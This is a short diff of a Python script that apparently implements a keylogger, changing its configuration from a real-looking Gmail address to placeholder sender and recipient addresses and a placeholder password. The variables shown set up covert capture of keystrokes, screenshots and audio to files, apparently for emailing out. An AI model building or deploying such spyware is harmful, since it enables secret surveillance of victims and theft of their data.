@@ -20,9 +20,9 @@ from PIL import ImageGrab #get screen shot
 
 keys = []
 count = 0
-email_address = "testingcyber12@gmail.com"
+email_address = "example@gmail.com" #example
 password = "password" #example
-toaddr = "emaple@gmail.com" #example
+toaddr = "exmaple@gmail.com" #example
 logkeypath = r"C:\Users\mouni\Downloads\logkeys.txt" #example
 screenpath=r"C:\Users\mouni\Downloads\screen.png"  #example
 audiopath=r"C:\Users\mouni\Downloads\audioinfo.wav"  #example
